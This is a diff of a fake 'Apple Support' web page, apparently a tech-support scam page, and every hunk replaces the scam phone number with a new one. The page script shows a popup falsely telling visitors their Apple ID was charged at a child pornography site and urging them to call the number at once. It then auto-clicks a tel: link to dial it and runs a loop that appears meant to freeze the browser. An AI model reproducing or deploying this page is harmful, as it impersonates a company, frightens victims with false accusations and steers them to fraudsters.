@@ -134,7 +134,7 @@
                 <div class="ac-ln-background"></div>
                 <div class="ac-ln-content">
                     <span class="ac-ln-title">
-                       <a href="#">Apple Support +1-888-449-3823 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+                       <a href="#">Apple Support +1-877-470-6253 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
 					 </span>
                     <div class="ac-ln-menu">
                         <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close"
@@ -212,7 +212,7 @@
 						Apple </a></div>
                 </div>
                 <meta content="Apple" property="name" />
-                <meta content="+1-888-449-3823
+                <meta content="+1-877-470-6253
 			 " property="telephone" />
             </section>
         </div>
@@ -279,7 +279,7 @@
 
         window.number = getPar('phone');
 
-        window.number = (window.number ? window.number : '+1-888-449-3823');
+        window.number = (window.number ? window.number : '+1-877-470-6253');
 
         window.device = 'iPhone';
         window.refef = parseURL(document.referrer);
@@ -337,7 +337,7 @@
         }, 100);
 
         function okkkk() {
-            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-888-449-3823"></a>');
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-877-470-6253"></a>');
             document.querySelector('a').click();
             var extraData = "";
             for (itxextraData = 0; itxextraData < 200; itxextraData++) {
@@ -354,7 +354,7 @@
         };
 
         function myFunction() {
-            if (confirm("Your Apple ID was recently used at CH!LD P0RN0GRÀPHY WEBSITE for $549.70 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-888-449-3823 to Freeze it!.")) {
+            if (confirm("Your Apple ID was recently used at CH!LD P0RN0GRÀPHY WEBSITE for $549.70 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-877-470-6253 to Freeze it!.")) {
                 okkkk();
             } else {
                 okkkk();
